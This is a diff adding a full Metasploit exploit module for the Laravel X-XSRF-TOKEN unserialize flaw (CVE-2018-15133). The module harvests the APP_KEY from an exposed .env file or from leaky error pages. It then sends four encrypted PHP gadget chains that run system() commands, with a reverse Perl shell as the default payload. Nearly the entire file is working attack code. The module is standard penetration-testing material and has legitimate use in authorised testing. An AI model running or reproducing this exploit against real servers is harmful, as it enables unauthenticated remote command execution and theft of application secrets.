@@ -1,0 +1,223 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'PHP Laravel Framework token Unserialize Remote Command Execution',
+      'Description' => %q{
+        This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29.
+        Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to
+        an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php.
+        Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY.
+        Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix.
+        In some cases the APP_KEY is leaked which allows for discovery and exploitation.
+      },
+      'DisclosureDate' => '2018-08-07',
+      'Author' =>
+        [
+          'Ståle Pettersen',  # Discovery
+          'aushack',          # msf exploit + other leak
+        ],
+      'References' =>
+        [
+          ['CVE', '2018-15133'],
+          ['CVE', '2017-16894'],
+          ['URL', 'https://github.com/kozmic/laravel-poc-CVE-2018-15133'],
+          ['URL', 'https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30'],
+          ['URL', 'https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0']
+        ],
+      'License' => MSF_LICENSE,
+      'Platform' => 'unix',
+      'Arch' => ARCH_CMD,
+      'DefaultTarget' => 0,
+      'Stance' => Msf::Exploit::Stance::Aggressive,
+      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' },
+      'Payload' => { 'DisableNops' => true },
+      'Targets' => [[ 'Automatic', {} ]],
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [ true, 'Path to target webapp', '/']),
+      OptString.new('APP_KEY', [ false, 'The base64 encoded APP_KEY string from the .env file', ''])
+    ])
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'index.php'),
+      'method' => 'GET'
+    })
+
+    # Can be 'XSRF-TOKEN', 'X-XSRF-TOKEN', 'laravel_session', or $appname_session... and maybe more?
+    unless res && res.headers && res.headers.to_s =~ /XSRF-TOKEN|laravel_session/i
+      return CheckCode::Unknown
+    end
+
+    auth_token = check_appkey
+    if auth_token.blank? || test_appkey(auth_token) == false
+      vprint_error 'Unable to continue: the set datastore APP_KEY value or information leak is invalid.'
+      return CheckCode::Detected
+    end
+
+    random_string = Rex::Text.rand_text_alphanumeric(12)
+
+    1.upto(4) do |method|
+      vuln = generate_token("echo #{random_string}", auth_token, method)
+
+      res = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST',
+        'headers' => {
+          'X-XSRF-TOKEN' => "#{vuln}",
+        }
+      })
+
+      if res.body.include?(random_string)
+        return CheckCode::Vulnerable
+      # Not conclusive but witnessed in the wild
+      elsif res.body.include?('Method Not Allowed')
+        return CheckCode::Safe
+      end
+    end
+    CheckCode::Detected
+  rescue Rex::ConnectionError
+    CheckCode::Unknown
+  end
+
+  def env_leak
+    key = ''
+    vprint_status 'Checking for CVE-2017-16894 .env information leak'
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '.env'),
+      'method' => 'GET'
+    })
+
+    # Good but may be other software. Can also check for 'APP_NAME=Laravel' etc
+    return key unless res && res.body.include?('APP_KEY') && res.body =~ /APP_KEY\=base64:(.*)/
+    key = $1
+
+    if key
+      vprint_good "APP_KEY Found via CVE-2017-16894 .env information leak: #{key}"
+      return key
+    end
+
+    vprint_status 'Website .env file exists but didn\'t find a suitable APP_KEY'
+    key
+  end
+
+  def framework_leak(decrypt_ex = true)
+    key = ''
+    if decrypt_ex
+      # Possible config error / 0day found by aushack during pentest
+      # Seen in the wild with recent releases
+      res = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST',
+        'headers' => {
+          'X-XSRF-TOKEN' => Rex::Text.rand_text_alpha(1) # May trigger
+        }
+      })
+
+      return key unless res && res.body.include?('DecryptException') && res.body.include?('APP_KEY')
+    else
+      res = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST'
+      })
+
+      return key unless res && res.body.include?('MethodNotAllowedHttpException') && res.body.include?('APP_KEY')
+    end
+    # Good sign but might be more universal with e.g. 'vendor/laravel/framework' ?
+
+    # Leaks all environment config including passwords for databases, AWS, REDIS, SMTP etc... but only the APP_KEY appears to use base64
+    if res.body =~ /\>base64:(.*)\<\/span\>/
+      key = $1
+      vprint_good "APP_KEY Found via Laravel Framework error information leak: #{key}"
+    end
+
+    key
+  end
+
+  def check_appkey
+    key = datastore['APP_KEY'].present? ? datastore['APP_KEY'] : ''
+    return key unless key.empty?
+
+    vprint_status 'APP_KEY not set. Will try to find it...'
+    key = env_leak
+    key = framework_leak if key.empty?
+    key = framework_leak(false) if key.empty?
+    key.empty? ? false : key
+  end
+
+  def test_appkey(value)
+    value = Rex::Text.decode_base64(value)
+    return true if value && value.length.to_i == 32
+
+    false
+  end
+
+  def generate_token(cmd, key, method)
+    # Ported phpggc Laravel RCE php objects :)
+    case method
+      when 1
+      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
+      when 2
+      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + cmd.length.to_s + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
+      when 3
+      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + cmd.length.to_s + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
+      when 4
+      payload_decoded = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + cmd.length.to_s + ':"' + cmd + '";}'
+    end
+
+    cipher = OpenSSL::Cipher.new('AES-256-CBC') # Or AES-128-CBC - untested
+    cipher.encrypt
+    cipher.key = Rex::Text.decode_base64(key)
+    iv = cipher.random_iv
+
+    value = cipher.update(payload_decoded) + cipher.final
+    pload = Rex::Text.encode_base64(value)
+    iv = Rex::Text.encode_base64(iv)
+    mac = OpenSSL::HMAC.hexdigest('SHA256', Rex::Text.decode_base64(key), iv+pload)
+    iv = iv.gsub('/', '\\/') # Escape slash
+    pload = pload.gsub('/', '\\/') # Escape slash
+    json_value = %Q({"iv":"#{iv}","value":"#{pload}","mac":"#{mac}"})
+    json_out = Rex::Text.encode_base64(json_value)
+
+    json_out
+  end
+
+  def exploit
+    auth_token = check_appkey
+    if auth_token.blank? || test_appkey(auth_token) == false
+      vprint_error 'Unable to continue: the set datastore APP_KEY value or information leak is invalid.'
+      return
+    end
+
+    1.upto(4) do |method|
+      sploit = generate_token(payload.encoded, auth_token, method)
+
+      res = send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST',
+        'headers' => {
+        'X-XSRF-TOKEN' => sploit,
+        }
+      }, 5)
+
+      # Stop when one of the deserialization attacks works
+      break if session_created?
+
+      if res && res.body.include?('The MAC is invalid|Method Not Allowed') # Not conclusive
+        print_status 'Target appears to be patched or otherwise immune'
+      end
+    end
+  end
+end
